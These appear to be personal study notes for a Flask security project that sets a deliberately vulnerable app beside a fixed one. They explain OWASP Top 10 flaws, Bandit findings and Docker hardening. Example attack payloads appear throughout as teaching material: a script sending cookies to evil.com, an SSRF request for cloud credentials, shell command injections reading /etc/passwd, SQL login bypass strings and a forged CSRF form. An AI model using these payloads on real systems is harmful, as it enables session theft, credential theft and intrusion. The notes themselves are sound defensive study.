# Secure Web App — Local Project Notes

This file is **gitignored** — never pushed to GitHub.
Your personal reference for concepts, commands, and interview prep.

---

## What This Project Is (Plain English)

Two versions of the same Flask web app:

- `vulnerable_app/app.py` — deliberately broken with OWASP Top 10 flaws
- `secure_app/app.py` — every flaw fixed, each fix annotated with why it works

The point is to **read them side by side**. Every `# FLAW:` in the vulnerable app has a matching `# FIX:` in the secure app. This teaches you to recognise insecure patterns in real codebases and know exactly how to fix them — the core skill of an AppSec engineer.

---

## OWASP Top 10 (2021) — What Each One Means

### A01 — Broken Access Control
The most common category. The app doesn't enforce who can see what.

**IDOR (Insecure Direct Object Reference):** Changing `/notes/1` to `/notes/2` in the URL lets you read someone else's note.
```python
# VULNERABLE — no ownership check
note = conn.execute("SELECT * FROM notes WHERE id = ?", (note_id,)).fetchone()

# SECURE — ownership enforced
note = conn.execute(
    "SELECT * FROM notes WHERE id = ? AND user_id = ?",
    (note_id, session["user_id"])   # session["user_id"] comes from the server, not the URL
).fetchone()
```

**Admin panel bypass:** If the role check reads from a forgeable session cookie, an attacker who knows your `SECRET_KEY` can forge a cookie saying `role=admin`.
Fix: re-read the role from the database on every admin request — never trust the cookie value for privilege decisions.

---

### A02 — Cryptographic Failures
Sensitive data is inadequately protected.

**MD5 passwords:**
MD5 is a hash function designed for speed. On a modern GPU you can crack ~10 billion MD5 hashes per second. A rainbow table for every common password exists and is freely downloadable.

```python
# VULNERABLE
hashlib.md5(password.encode()).hexdigest()

# SECURE — bcrypt is designed to be slow (250ms per hash = 40 billion× harder to crack)
bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

bcrypt's `gensalt()` generates a random 16-byte salt per user. Even if two users have the same password, their hashes are completely different. The salt is stored inside the hash string itself — you don't need to store it separately.

---

### A03 — Injection
User input is executed as code (SQL, shell commands, HTML).

**SQL Injection:**
```python
# VULNERABLE — string interpolation lets attacker control the SQL structure
query = f"SELECT * FROM users WHERE username='{username}'"
# username = "admin' --"  → comments out password check → login bypass

# SECURE — parameterised query: ? is a placeholder, the value is never parsed as SQL
conn.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**Command Injection:**
```python
# VULNERABLE — semicolon lets attacker chain shell commands
subprocess.run(f"ping -c 1 {host}", shell=True)
# host = "127.0.0.1; cat /etc/passwd"  → runs both commands

# SECURE — list args with shell=False, each item is treated as a literal argument
subprocess.run(["/bin/ping", "-c", "1", "-W", "2", host])
# shell metacharacters ; | && are just characters, not operators
```

**Cross-Site Scripting (XSS):**
XSS happens when user input is rendered as HTML without escaping.
```python
# VULNERABLE — f-string bypasses Jinja2's auto-escaping
return f"<h2>Results for: {query}</h2>"
# query = "<script>document.location='https://evil.com?c='+document.cookie</script>"
# → steals every visitor's session cookie

# SECURE — render_template() with Jinja2 auto-escaping ON
return render_template("search.html", query=query, results=rows)
# {{ query }} in the template becomes &lt;script&gt;... (harmless text)
```

---

### A04 — Insecure Design
Security was not considered during design — missing controls that should have been built in from the start.

- No rate limiting on login → unlimited password guessing
- No password complexity → "a" is a valid password
- No account lockout → brute force runs forever

Fix: Flask-Limiter for rate limiting, WTForms validators for complexity, bcrypt's slowness as a natural brute-force throttle.

---

### A05 — Security Misconfiguration

```python
# VULNERABLE — debug mode exposes an interactive Python shell to anyone who triggers an error
app.run(debug=True)
# An attacker deliberately causes a 500 error, gets a REPL, runs os.system("id")

# SECURE — debug off, read from environment variable
app.config["DEBUG"] = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
```

```python
# VULNERABLE — hardcoded secret key (anyone who reads the code can forge session cookies)
app.secret_key = "supersecret123"

# SECURE — from environment variable, random fallback for development
app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(32)
```

**Security headers** — the secure app adds these to every response:
| Header | Protects against |
|--------|-----------------|
| `Content-Security-Policy` | XSS (blocks inline scripts from unexpected sources) |
| `X-Frame-Options: SAMEORIGIN` | Clickjacking (prevents embedding in iframes) |
| `X-Content-Type-Options: nosniff` | MIME-sniffing attacks |
| `Strict-Transport-Security` | SSL stripping (forces HTTPS) |
| `Referrer-Policy` | Leaking URLs to third parties |

---

### A07 — Authentication Failures

**Session fixation:** If an attacker can set your session ID before you log in, they already have access after you authenticate.
Fix: `session.clear()` before setting new session data on login — this regenerates the session ID.

**Secure cookie flags:**
```python
SESSION_COOKIE_SECURE=True      # only sent over HTTPS
SESSION_COOKIE_HTTPONLY=True    # JavaScript cannot read it → XSS can't steal it
SESSION_COOKIE_SAMESITE="Lax"   # not sent in cross-site requests → CSRF mitigation
```

---

### A09 — Security Logging Failures
The vulnerable app logs nothing. If you don't log failed logins, you can't detect a brute-force attack in progress.

The secure app uses a `security_logger` that logs:
- Successful logins (username + IP)
- Failed login attempts (username + IP) — these are the attack pattern
- Privilege escalation attempts (someone hitting the admin endpoint without the role)
- SSRF attempts (someone trying to reach internal IPs via /fetch)

---

### A10 — Server-Side Request Forgery (SSRF)
The server fetches a URL the user supplies. The server has access to internal networks the attacker doesn't.

```
Attacker → /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
         → AWS returns IAM credentials for the instance
         → Attacker now has full AWS access
```

Fix: parse the URL, extract the hostname, reject:
- Private IP ranges: `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`
- Loopback: `127.x.x.x`, `::1`
- Link-local: `169.254.x.x` (AWS/GCP/Azure metadata)
- Non-http(s) schemes: `file://`, `gopher://`, `dict://`
- Domains not on an explicit allowlist

---

### CSRF — Cross-Site Request Forgery
Not a dedicated OWASP category but covered under A01/A04.

An attacker on `evil.com` has a hidden form that submits to your app:
```html
<form action="https://yourbank.com/transfer" method="post">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```
If you're logged in to yourbank.com, the browser sends your session cookie automatically.

Fix: Flask-WTF generates a random token embedded in every form (`{{ form.hidden_tag() }}`). On POST, it validates the token. An attacker on evil.com can't read the token (same-origin policy), so the forged request fails.

---

## SAST — What Bandit Catches

Run `bandit -r vulnerable_app/ -l` and you'll see:

| Bandit ID | What it flags | In the code |
|-----------|--------------|-------------|
| B608 | SQL injection via string formatting | `f"SELECT...{username}"` |
| B602 | subprocess with shell=True | `subprocess.run(..., shell=True)` |
| B324 | Weak hash (MD5) | `hashlib.md5(...)` |
| B105 | Hardcoded password string | `secret_key = "supersecret123"` |
| B201 | Flask debug=True | `app.run(debug=True)` |
| B310 | URL open without validation | `urllib.request.urlopen(url)` |
| B403 | subprocess module imported | (informational) |

Bandit gives each finding a severity (LOW/MEDIUM/HIGH) and confidence (LOW/MEDIUM/HIGH).
**HIGH severity + HIGH confidence = real bug, fix immediately.**

---

## Docker Hardening Explained

### Non-root user
```dockerfile
RUN useradd --uid 1001 appuser
USER appuser
```
If an attacker achieves RCE inside the container, they run as `appuser`. They can't:
- Install tools (`apt-get` requires root)
- Write to the filesystem (read-only)
- Escalate to root (no sudo)

### Read-only filesystem
```yaml
read_only: true
tmpfs:
  - /tmp:size=64m,noexec,nosuid
```
Malware can't write itself to disk. Even if code runs, it can't persist.

### Drop capabilities
```yaml
cap_drop:
  - ALL
cap_add:
  - NET_BIND_SERVICE
```
Linux capabilities control what privileged operations a process can perform. We drop everything, then add back only what's needed (binding to a port).

### Internal network
```yaml
networks:
  internal:
    internal: true
```
The app container has no outbound internet access. An SSRF payload trying to reach `https://evil.com` is blocked at the network layer even if our code validation fails.

---

## Commands to Run the Project

```bash
cd /run/media/shamath/C4CAC629CAC61796/code/cybersec/secure-webapp

# Install dependencies
pip install -r requirements.txt
```

### Run the VULNERABLE app (learn the flaws)
```bash
python3 vulnerable_app/app.py
# Visit: http://localhost:5000

# Try these attacks:
# 1. SQL injection login bypass:
#    Username: admin' --
#    Password: anything
#
# 2. IDOR — log in as alice/alice123, then visit:
#    http://localhost:5000/notes/1  (you see admin's secret note)
#
# 3. XSS — post this as a comment:
#    <script>alert('XSS works!')</script>
#
# 4. Command injection:
#    http://localhost:5000/ping?host=127.0.0.1;id
#
# 5. Sensitive data exposure (no login needed):
#    http://localhost:5000/export
```

### Run the SECURE app (fixed version)
```bash
export SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
python3 secure_app/app.py
# Visit: http://localhost:5001

# Default admin: admin / ChangeMe!SecureP@ss1

# Try the same attacks — they all fail:
# SQL injection: "admin' --" finds no user (it's treated as a literal string)
# IDOR: /notes/1 returns 404 (you only see your own notes)
# XSS: <script> is stripped by bleach before storage
# Command injection: 400 Bad Request (hostname validation rejects semicolons)
# /export: 401 Unauthorized (requires admin login)
```

### Run Bandit SAST
```bash
pip install bandit

# See all the flaws Bandit catches in the vulnerable app
bandit -r vulnerable_app/ -l

# Verify the secure app is clean (expect zero HIGH severity)
bandit -r secure_app/ -ll

# Generate a JSON report
bandit -r vulnerable_app/ -f json -o bandit-report.json
```

### Run tests
```bash
pytest tests/ -v

# With coverage
pytest tests/ -v --cov=secure_app --cov-report=html
firefox htmlcov/index.html
```

### Run with Docker
```bash
export SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
docker-compose up --build
# Visit: http://localhost (nginx proxies to gunicorn)
```

---

## Interview Questions This Project Answers

**"Walk me through an SQL injection attack and how you fixed it."**
> In the vulnerable app, the login query concatenates user input directly into SQL. The payload `admin' --` closes the string literal early and comments out the password check, so any password works. The fix is a parameterised query — using `?` as a placeholder means the database driver handles escaping, and user input is always treated as data, never as SQL syntax.

**"What's the difference between stored XSS and reflected XSS?"**
> Reflected XSS: the payload is in the URL and immediately echoed back in the response. Only affects users who visit the crafted URL. Stored XSS: the payload is saved to the database and rendered to every user who visits the page — much more dangerous. This app demonstrates stored XSS via the comments feature: `<script>...</script>` posted as a comment executes for every user who loads the page.

**"What is CSRF and how does Flask-WTF prevent it?"**
> CSRF tricks a logged-in user's browser into making requests they didn't intend — a hidden form on evil.com submitting to your bank. Flask-WTF generates a random token embedded in every form. It validates the token on every POST. An attacker on another domain can't read the token because of browser same-origin policy, so their forged request fails validation.

**"Why is MD5 not suitable for passwords?"**
> MD5 is designed for speed — useful for file checksums, terrible for passwords. Modern GPUs can compute ~10 billion MD5 hashes per second, making brute force trivial. bcrypt is purpose-built for passwords: it's intentionally slow (adjustable work factor), includes a random salt to defeat rainbow tables, and the algorithm is designed to stay slow as hardware improves.

**"What does the Content-Security-Policy header do?"**
> CSP tells the browser which sources scripts, styles, and other resources are allowed to load from. A strict CSP like `script-src 'self'` means only scripts from the same domain are executed. An attacker who injects `<script src="https://evil.com/steal.js">` via XSS finds that the browser refuses to load it. CSP is defence-in-depth — it doesn't replace output encoding but limits the blast radius when XSS does occur.

---

## Common Errors and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `ModuleNotFoundError: flask_wtf` | Dependencies not installed | `pip install -r requirements.txt` |
| `SECRET_KEY must be set` | docker-compose needs the env var | `export SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")` |
| `TemplateNotFound: login.html` | Templates folder missing | Already fixed — templates are in `secure_app/templates/` |
| `CSRF token missing` | Posting to a form without `{{ form.hidden_tag() }}` | Make sure every form includes `{{ form.hidden_tag() }}` |
| `400 Bad Request on ping` | Input contains characters not in `[a-zA-Z0-9.\-]` | Expected — the validator is working correctly |
